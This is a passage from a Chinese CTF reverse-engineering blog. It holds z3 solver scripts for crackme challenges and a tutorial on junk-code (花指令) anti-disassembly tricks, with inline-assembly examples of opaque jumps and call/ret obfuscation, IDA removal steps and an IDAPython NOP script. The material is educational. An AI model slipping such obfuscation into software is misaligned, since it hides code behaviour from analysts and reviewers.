class="hljs-number"> 51 </span>- a5 *<span class="hljs-number"> 43 </span>+ a6 *<span class="hljs-number"> 81 </span>+ a7 *<span class="hljs-number"> 22 </span>- a8 *<span class="hljs-number"> 12 </span>- a9 *<span class="hljs-number"> 38 </span>+ a10 *<span class="hljs-number"> 75 </span>+ a11 *<span class="hljs-number"> 41 </span>+ a12 *<span class="hljs-number"> 27 </span>- a13 *<span class="hljs-number"> 52 </span>+ a14 *<span class="hljs-number"> 31 </span>== 13376)<br>s.add(a1 *<span class="hljs-number"> 85 </span>+ a2 *<span class="hljs-number"> 63 </span>+ a3 *<span class="hljs-number"> 5 </span>- a4 *<span class="hljs-number"> 51 </span>+ a5 *<span class="hljs-number"> 44 </span>+ a6 *<span class="hljs-number"> 36 </span>+ a7 *<span class="hljs-number"> 28 </span>+ a8 *<span class="hljs-number"> 15 </span>- a9 *<span class="hljs-number"> 6 </span>+ a10 *<span class="hljs-number"> 45 </span>+ a11 *<span class="hljs-number"> 31 </span>+ a12 *<span class="hljs-number"> 7 </span>- a13 *<span class="hljs-number"> 67 </span>+ a14 *<span class="hljs-number"> 78 </span>== 24065)<br>s.add(a1 *<span class="hljs-number"> 47 </span>+ a2 *<span class="hljs-number"> 64 </span>+ a3 *<span class="hljs-number"> 66 </span>- a4 *<span class="hljs-number"> 5 </span>+ a5 *<span class="hljs-number"> 43 </span>+ a6 *<span class="hljs-number"> 112 </span>+ a7 *<span class="hljs-number"> 25 </span>+ a8 *<span class="hljs-number"> 13 </span>- a9 *<span class="hljs-number"> 35 </span>+ a10 *<span class="hljs-number"> 95 </span>+ a11 *<span class="hljs-number"> 21 </span>+ a12 *<span class="hljs-number"> 43 </span>- a13 *<span class="hljs-number"> 61 </span>+ a14 *<span class="hljs-number"> 20 </span>== 27687)<br>s.add(a1 *<span class="hljs-number"> 89 </span>+ a2 *<span class="hljs-number"> 67 </span>+ a3 *<span class="hljs-number"> 85 </span>- a4 *<span class="hljs-number"> 25 </span>+ a5 *<span class="hljs-number"> 49 </span>+ a6 *<span class="hljs-number"> 89 </span>+ a7 *<span class="hljs-number"> 23 </span>+ a8 *<span class="hljs-number"> 56 </span>- a9 *<span class="hljs-number"> 92 </span>+ a10 *<span class="hljs-number"> 14 </span>+ a11 *<span class="hljs-number"> 89 </span>+ a12 *<span class="hljs-number"> 47 </span>- a13 *<span class="hljs-number"> 61 </span>- a14 *<span class="hljs-number"> 29 </span>== 29250)<br>s.add(a1 *<span class="hljs-number"> 95 </span>+ a2 *<span class="hljs-number"> 34 </span>+ a3 *<span class="hljs-number"> 62 </span>- a4 *<span class="hljs-number"> 9 </span>- a5 *<span class="hljs-number"> 43 </span>+ a6 *<span class="hljs-number"> 83 </span>+ a7 *<span class="hljs-number"> 25 </span>+ a8 *<span class="hljs-number"> 12 </span>- a9 *<span class="hljs-number"> 36 </span>+ a10 *<span class="hljs-number"> 16 </span>+ a11 *<span class="hljs-number"> 51 </span>+ a12 *<span class="hljs-number"> 47 </span>- a13 *<span class="hljs-number"> 60 </span>- a14 *<span class="hljs-number"> 24 </span>== 15317)<br><br>if &#x27;un&#x27; not in str(s.check()):<br>    print(s.model())<br><br>direct=&#123;<br>   <span class="hljs-number"> 13 </span>: 33,<br>   <span class="hljs-number"> 3 </span>: 7,<br>   <span class="hljs-number"> 4 </span>: 104,<br>   <span class="hljs-number"> 10 </span>: 88,<br>   <span class="hljs-number"> 12 </span>: 88,<br>   <span class="hljs-number"> 1 </span>: 24,<br>   <span class="hljs-number"> 7 </span>: 91,<br>   <span class="hljs-number"> 9 </span>: 52,<br>   <span class="hljs-number"> 6 </span>: 28,<br>   <span class="hljs-number"> 5 </span>: 43,<br>   <span class="hljs-number"> 0 </span>: 10,<br>   <span class="hljs-number"> 8 </span>: 108,<br>   <span class="hljs-number"> 2 </span>: 119,<br>   <span class="hljs-number"> 11 </span>: 74<br>&#125;<br>flag=[0 for i in range(15)]<br>for i in direct:<br>    flag[i]=direct[i]<br><br>for i in range(13,-1,-1):<br>    flag[i]^=flag[i+1]<br><br>for  i in range(14):<br>    print(chr(flag[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721791549516-6b414aa8-6fec-4e08-8b64-15086e37809c.png"></p><p>最后进行md5加密</p><p>58964088b637e50d3a22b9510c1d1ef8</p><h2 id="2、babe-ze3（不会）"><a href="#2、babe-ze3（不会）" class="headerlink" title="2、babe-ze3（不会）"></a>2、babe-ze3（不会）</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1726988449299-2134c22d-c2a5-4353-8577-a74dafbacf54.png"></p><p>网站Hint最后一个if有问题，狗屁通说v4和 !(_DWORD)v4无法同时成立</p><p>之前Z3解密用的都是Ints类型，这次运算有变，变成BitVec()位向量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> libnum import n2s<br><span class="hljs-keyword">from</span> z3 import *<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><br><span class="hljs-comment"># 定义变量</span><br>s = BitVec(<span class="hljs-string">&#x27;s&#x27;</span>, 64)<br>v6 = BitVec(<span class="hljs-string">&#x27;v6&#x27;</span>, 64)<br>v7 = BitVec(<span class="hljs-string">&#x27;v7&#x27;</span>, 64)<br>v8 = BitVec(<span class="hljs-string">&#x27;v8&#x27;</span>, 64)<br>solver = Solver()<br><br><span class="hljs-comment"># 添加条件</span><br>solver.<span class="hljs-built_in">add</span>((v7 &amp; s &amp; v8 | (~(v6 | s) | v6 &amp; v7) &amp; v6 &amp; s) == 0x2024243035302131)<br>solver.<span class="hljs-built_in">add</span>((v6 ^ (v7 &amp; (s + v7) | v8 &amp; ~(v7 &amp; s) | v6 &amp; (v6 + v8) &amp; ~s)) == 0x7071001344417B54)<br>solver.<span class="hljs-built_in">add</span>(((v7 - v8) ^ (s - v6)) == 0x3FE01013130FFD3)<br>solver.<span class="hljs-built_in">add</span>((s + v7 - v8 + v6) * (v8 + s + v6 - v7) == 0x1989A41A9049C5C9)<br>solver.<span class="hljs-built_in">add</span>((v7 + v6 + s + v8) % 0x1BF52 == 21761)<br>solver.<span class="hljs-built_in">add</span>(v8 * v7 * v6 * s % 0x1D4B42 == 827118)<br><br><span class="hljs-comment"># 检查是否有解</span><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br><br>    # 输出变量的解<br>    s_val = model[s].as_long()<br>    v6_val = model[v6].as_long()<br>    v7_val = model[v7].as_long()<br>    v8_val = model[v8].as_long()<br><br>    # 将解转换为字符串<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s:&quot;</span>, n2s(s_val))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v6:&quot;</span>, n2s(v6_val))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v7:&quot;</span>, n2s(v7_val))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v8:&quot;</span>, n2s(v8_val))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution found&quot;</span>)<br><br><span class="hljs-comment"># 处理字符串翻转</span><br>s = <span class="hljs-string">&#x27;cd5250c9dbc4fdab1760517947e35495&#x27;</span><br>s1 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, 32, 8):<br>    a = s[i:i+8]<br>    a = a[::-1]  # 翻转每个8字符的子串<br>    s1 += a<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Processed string:&quot;</span>, s1)<br><span class="hljs-comment"># 结果应为: 9c0525dcba4fdfbd9715067159453e74</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>REVERSE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令</title>
    <link href="/2025/03/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
    <url>/2025/03/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>参考链接：</p><p><a href="https://blog.csdn.net/m0_51246873/article/details/127167749">https://blog.csdn.net/m0_51246873&#x2F;article&#x2F;details&#x2F;127167749</a></p><p><a href="https://www.cnblogs.com/YenKoc/p/14136012.html">https://www.cnblogs.com/YenKoc/p/14136012.html</a></p><p><a href="https://www.xjx100.cn/news/40167.html?action=onClick">https://www.xjx100.cn/news/40167.html?action=onClick</a></p><p><a href="https://mp.weixin.qq.com/s/MUth1Qw-Fl2a5OrLw_2_0g">https://mp.weixin.qq.com/s/MUth1Qw-Fl2a5OrLw_2_0g</a></p><h3 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h3><ul><li>0xE8 call + 4字节偏移地址</li><li>0xE9 jmp + 4字节偏移地址</li><li>0xEB jmp + 2字节偏移地址</li><li>0xFF15 call + 4字节地址</li><li>0xFF25 jmp + 4字节地址</li><li>0xcc int 3</li><li>0xe2 loop</li><li>0x0f84 jz</li><li>0x0f85 jnz</li></ul><h1 id="一、什么是花指令"><a href="#一、什么是花指令" class="headerlink" title="一、什么是花指令"></a>一、什么是花指令</h1><h2 id="1）定义"><a href="#1）定义" class="headerlink" title="1）定义"></a>1）定义</h2><p>花指令又名垃圾代码、脏字节，英文名是junk code。花指令就是在不影响程序运行的情况下，往真实代码中插入一些垃圾代码，从而影响反汇编器的正常运行；或是起到干扰逆向分析人员的静态分析，增加分析难度和分析时间。</p><h2 id="2）分类"><a href="#2）分类" class="headerlink" title="2）分类"></a>2）分类</h2><p>花指令分为不可执行花指令、可执行花指令</p><p>可执行花指令 顾名思义，可以执行的花指令，这部分垃圾代码会在程序运行的时候执行，但是执行这些指令没有任何意义，并不会改变寄存器的值，同时反汇编器也可以正常的反汇编这些指令。目的是为了增加静态分析的难度，加大逆向分析人员的工作量。</p><p>不可执行花指令 不可以执行的花指令，这类花指令会使反编译器在反编译的时候出错，反汇编器可能错误的反汇编这些指令。根据反汇编的工作原理，只有花指令同正常指令的前几个字节被反汇编器识别成一组无用字节时，才能破坏反汇编的结果。因此，插入的花指令应当是一些不完整的指令，被插入的不完整指令可以是随机选择的。</p><p>为了能够有效迷惑反汇编器，同时又确保代码的正确运行，花指令必须满足两个基本特征，即：</p><p>垃圾数据必须是某个合法指令的一部分。</p><p>程序运行时，花指令必须位于实际不可执行的代码路径。</p><h2 id="3）原理：反汇编算法的设计缺陷"><a href="#3）原理：反汇编算法的设计缺陷" class="headerlink" title="3）原理：反汇编算法的设计缺陷"></a>3）原理：反汇编算法的设计缺陷</h2><h3 id="常用的两类反汇编算法："><a href="#常用的两类反汇编算法：" class="headerlink" title="常用的两类反汇编算法："></a>常用的两类反汇编算法：</h3><h3 id="1-线性扫描算法：逐行反汇编（无法将数据和内容进行区分）"><a href="#1-线性扫描算法：逐行反汇编（无法将数据和内容进行区分）" class="headerlink" title="1.线性扫描算法：逐行反汇编（无法将数据和内容进行区分）"></a>1.线性扫描算法：逐行反汇编（无法将数据和内容进行区分）</h3><h3 id="2-递归行进算法：按照代码可能的执行顺序进行反汇编程序。"><a href="#2-递归行进算法：按照代码可能的执行顺序进行反汇编程序。" class="headerlink" title="2.递归行进算法：按照代码可能的执行顺序进行反汇编程序。"></a>2.递归行进算法：按照代码可能的执行顺序进行反汇编程序。</h3><p>通过构造必然条件或者互补条件，使得反汇编出错。</p><p>简单的花指令 0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721353714172-ef35ee9e-46b1-4b38-8f69-d092c481c64e.png"></p><p>两个跳转一个指向无效数据，一个指向正常数据来干扰递归扫描算法。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721353731931-85bade96-9930-45db-8310-219b37978149.png"></p><h1 id="二、花指令实现"><a href="#二、花指令实现" class="headerlink" title="二、花指令实现"></a>二、花指令实现</h1><h2 id="1-简单jmp"><a href="#1-简单jmp" class="headerlink" title="1.简单jmp"></a>1.简单jmp</h2><p>这是最简单的花指令。</p><p>这种jmp单次跳转只能骗过线性扫描算法，会被IDA识别（递归下降）。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">__asm&#123;<br>    <span class="hljs-keyword">jmp</span> label1<br>    db junkcode<br><span class="hljs-symbol">label1:</span>    <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721353831882-437540b9-d9ee-444d-ae43-d6fefd84e2a4.png"></p><h2 id="2-多层跳转"><a href="#2-多层跳转" class="headerlink" title="2.多层跳转"></a>2.多层跳转</h2><p>本质上和简单跳转是一样的，只是加了几层跳转。显然无法干扰ida</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">start:</span>//花指令开始<br>    jmp <span class="hljs-type">label</span><span class="hljs-number">1</span><br>    DB junkcode<br><span class="hljs-type">label</span><span class="hljs-number">1</span>:<br>     jmp <span class="hljs-type">label</span><span class="hljs-number">2</span><br>     DB junkcode<br><span class="hljs-type">label</span><span class="hljs-number">2</span>：<br>    jmp <span class="hljs-type">label</span><span class="hljs-number">3</span><br>    DB junkcode<br><span class="hljs-type">label</span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721353897203-27c5bf24-9868-4bf7-87fe-934e95597735.png"></p><p>和单次跳转一样，这种也会被IDA识别。</p><p>为了骗过IDA，我们将上面的花指令改写一下，</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__asm</span> &#123;<br>       <span class="hljs-variable">_emit</span> <span class="hljs-number">0</span>xE8<br>       <span class="hljs-variable">_emit</span> <span class="hljs-number">0</span>xFF<br>            <span class="hljs-comment">//_emit 立即数：代表在这个位置插入一个数据，这里插入的是0xe8</span><br>      &#125;<br></code></pre></td></tr></table></figure><p>查看反汇编后的结果</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721353917638-face0e41-fb41-4564-abca-f16174675321.png"></p><p>可以看到IDA错误的识别loc_411877处的代码，成功的实现了花指令的目的。那么我们知道了如何构造，自然也就明白了如何去除，只需要将插入的立即数nop掉即可，点击0xe8和0xff，点击右键，选择patching-&gt;change byte</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721353962580-686cdcb7-ccd7-49e9-8f4a-0f72693996f5.png"></p><p>也可以使用一个idapython脚本添加一个快捷键，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">from</span> idaapi import *<br><span class="hljs-selector-tag">from</span> idc import *<br>def nopIt():<br>        start = <span class="hljs-built_in">get_screen_ea</span>()<br>        <span class="hljs-built_in">patch_byte</span>(start,<span class="hljs-number">0</span>x90)<br>        <span class="hljs-built_in">refresh_idaview_anyway</span>()<br> <br><span class="hljs-built_in">add_hotkey</span>(<span class="hljs-string">&quot;ctrl-N&quot;</span>,nopIt)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721355270856-35c64945-085f-467d-82c9-447cde006700.png"></p><p>idapython在File - Script commannd…处 也可以Shift+F2快捷键打开</p><h2 id="3-jz和jnz条件跳转-jz为1跳转-jnz为0跳转"><a href="#3-jz和jnz条件跳转-jz为1跳转-jnz为0跳转" class="headerlink" title="3.jz和jnz条件跳转(jz为1跳转,jnz为0跳转)"></a>3.jz和jnz条件跳转(jz为1跳转,jnz为0跳转)</h2><p>利用jz和jnz的互补条件跳转指令来代替jmp。骗过OD</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm">_asm&#123;<br>    jz <span class="hljs-type">label</span><span class="hljs-number">1</span><br>    jnz <span class="hljs-type">label</span><span class="hljs-number">1</span><br>    db junkcode<br><span class="hljs-type">label</span><span class="hljs-number">1</span>:    <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721354098458-f42c0e73-1730-44fc-a918-2ca8d5cb625b.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">__asm &#123;<br>        jz <span class="hljs-selector-tag">Label</span>;<br>                jnz <span class="hljs-selector-tag">Label</span>;<br>                _emit <span class="hljs-number">0</span>xC7;<br><span class="hljs-selector-tag">Label</span>:<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721354121403-d10f9e67-3634-4188-b8e9-e87e17e47bca.png"></p><p>这种混淆去除方式也很简单，特征也很明显，因为是近跳转，所以ida分析的时候会分析出jz或者jnz会跳转几个字节，这个时候我们就可得到垃圾数据的长度，将该长度字节的数据全部nop掉即可解混淆。</p><h2 id="4-永真条件跳转"><a href="#4-永真条件跳转" class="headerlink" title="4.永真条件跳转"></a>4.永真条件跳转</h2><p>通过设置永真或者永假的，导致程序一定会执行，由于ida反汇编会优先反汇编接下去的部分（false分支）。也可以调用某些函数会返回确定值，来达到构造永真或永假条件。ida和OD都被骗过去了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">__asm&#123;<br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">ebx</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">ebx</span><br>    <span class="hljs-keyword">test</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">ebx</span><br><span class="hljs-symbol">    jnz label</span>1<br><span class="hljs-symbol">    jz label</span>2<br><span class="hljs-symbol">label1:</span><br>    _emit junkcode<br><span class="hljs-symbol">label2:</span><br>   <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span>//需要恢复<span class="hljs-built_in">ebx</span>寄存器    <br>&#125;<br> <br>__asm&#123;<br>        <span class="hljs-keyword">clc</span><br><span class="hljs-symbol">        jnz label</span>1:<br>        _emit junkcode<br><span class="hljs-symbol">label1:</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721354481334-ab9e26c5-da68-49df-bd2a-bb462bf71f83.png"></p><p>确保一个支路永远跳转</p><p>在另一个不跳转的支路填充垃圾代码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">__asm &#123;<br>         <span class="hljs-keyword">push</span> <span class="hljs-built_in">ebx</span><span class="hljs-comment">;</span><br>         <span class="hljs-keyword">xor</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span><span class="hljs-comment">;</span><br>         <span class="hljs-keyword">test</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span><span class="hljs-comment">;</span><br><span class="hljs-symbol">         jnz LABEL</span>7<span class="hljs-comment">;</span><br><span class="hljs-symbol">         jz    LABEL</span>8<span class="hljs-comment">;</span><br><span class="hljs-symbol">     LABEL7:</span><br>         _emit <span class="hljs-number">0xC7</span><span class="hljs-comment">;</span><br><span class="hljs-symbol">     LABEL8:</span><br>         <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span><span class="hljs-comment">;</span><br>     &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721354674154-02aa9af9-394c-4f26-874d-96e9cab3a7f4.png"></p><p>先对ebx进行xor之后，再进行test比较，zf标志位肯定为1，就肯定执行jz LABEL8，也就是说中间0xC7永远不会执行。</p><p>解混淆的时候也需要稍加注意，需要分析一下哪里是哪里是真正会跳到的位置，然后将垃圾数据nop掉，本质上和前面几种没什么不同。</p><h2 id="5-call-ret构造花指令"><a href="#5-call-ret构造花指令" class="headerlink" title="5.call&amp;ret构造花指令"></a>5.call&amp;ret构造花指令</h2><p>这里利用call和ret，在函数中修改返回地址，达到跳过thunkcode到正常流程的目的。可以干扰ida的正常识别</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs llvm">__asm&#123;<br>    <span class="hljs-keyword">call</span> <span class="hljs-type">label</span><span class="hljs-number">1</span><br>    _emit junkcode<br><span class="hljs-type">label</span><span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">add</span> dword <span class="hljs-type">ptr</span> ss:[esp]<span class="hljs-punctuation">,</span><span class="hljs-number">8</span>//具体增加多少根据调试来<br>    <span class="hljs-keyword">ret</span><br>    _emit junkcode<br>&#125;<br> <br><span class="hljs-keyword">call</span>指令：将下一条指令地址压入栈，再跳转执行<br><span class="hljs-keyword">ret</span>指令：将保存的地址取出，跳转执行<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721354747698-fce4acab-e2a3-4820-ad8d-c3c4b0bc8207.png"></p><h2 id="6-汇编指令共用opcode"><a href="#6-汇编指令共用opcode" class="headerlink" title="6.汇编指令共用opcode"></a>6.汇编指令共用opcode</h2><p>jmp的条指令是inc eax的第一个字节，inc eax和dec eax抵消影响。这种共用opcode确实比较麻烦</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721355060769-14200fc6-a5ac-4cb2-a762-0047ddc96c46.png"></p><h1 id="三、清除花指令"><a href="#三、清除花指令" class="headerlink" title="三、清除花指令"></a>三、清除花指令</h1><h2 id="手动清除"><a href="#手动清除" class="headerlink" title="手动清除"></a>手动清除</h2><p>找到所有的花指令，重新设置数据和代码地址。或者将花指令设置为nop（0x90）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721355096586-1256c005-1aa5-4818-8ab2-f5b54b6524f5.png"></p><p>在0x401051设置为数据类型（快捷键D）,在0x401052设置为代码类型（快捷键C）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721355107870-87ecf08e-d247-4ba0-aea0-be643e603ac5.png"></p><p>这里用一个ida python脚本添加ALT+N快捷键来将指令的第一个字节设置为NOP</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">from</span> idaapi import *<br><span class="hljs-selector-tag">from</span> idc import *<br> <br>def nopIt():<br>        start = <span class="hljs-built_in">get_screen_ea</span>()<br>        <span class="hljs-built_in">patch_byte</span>(start,<span class="hljs-number">0</span>x90)<br>        <span class="hljs-built_in">refresh_idaview_anyway</span>()<br> <br><span class="hljs-built_in">add_hotkey</span>(<span class="hljs-string">&quot;alt-N&quot;</span>,nopIt)<br></code></pre></td></tr></table></figure><p>参考文章</p><p>原文链接：<a href="https://blog.csdn.net/Daphneohh/article/details/139422749">https://blog.csdn.net/Daphneohh/article/details/139422749</a></p><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><p>P 保存汇编代码</p><p>F5 反编译</p><p>shift+2 编写exp</p><h1 id="例题jmp"><a href="#例题jmp" class="headerlink" title="例题jmp"></a>例题jmp</h1><h2 id="1、nssctf-jump-by-jump"><a href="#1、nssctf-jump-by-jump" class="headerlink" title="1、nssctf jump_by_jump"></a>1、nssctf jump_by_jump</h2><p>先查壳，放32位ida</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721355605284-25d82ffd-8ff4-4e1b-9b9b-7a7a5024de5d.png"></p><p>看汇编</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721355741298-94b3219c-21be-4a97-81c0-bee09fa2c39e.png"></p><p>打开Options-General</p><p>可以把stack pointer打开，</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721356426237-2f6effe2-8f8e-4db0-bf84-c8afa8fbb83a.png"></p><p>是jz和jnz构造的互补跳转花指令，还是先option设置打开opcode bytes的显示；将e8改为90（nop）</p><p>选中这一行，Edit-Patch program-Change bytes</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721356324223-94bce652-480d-4b16-8f5f-80d2ba8a3147.png"></p><p>把第一个e9改为90就好，接着对main函数用P重新定义下，再F5反编译就🆗了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721356019280-8e4fca2b-6f4c-4e79-a40a-e863aab4c0cd.png"></p><p>再点击黄色部分，一步一步按C转换为代码，直到没有黄色为止。</p><p>然后对main函数用p重定义一下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721356369534-3028e209-b08b-4300-ba89-db9d6d0733b5.png"></p><p>然后f5反编译就可以得到flag了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721356564797-e41d12c2-cdd7-4da6-b1ed-7694a2ec6a34.png"></p><h2 id="2、jump-by-jump-reverse"><a href="#2、jump-by-jump-reverse" class="headerlink" title="2、jump_by_jump_reverse"></a>2、jump_by_jump_reverse</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721356763308-288ef2d5-939b-4f35-bbe9-0be31867e327.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721356811914-ba4008be-9c4b-4160-89f7-24f755182229.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721356848763-4ccf8251-7da8-4ea2-9795-f2cea0eb5329.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_right</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">32</span> &lt;= <span class="hljs-built_in">ord</span>(c) &lt;= <span class="hljs-number">125</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_transformation</span>():<br>    Str1 = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        original_val = (<span class="hljs-built_in">ord</span>(Str1[i]) - <span class="hljs-number">32</span>) - <span 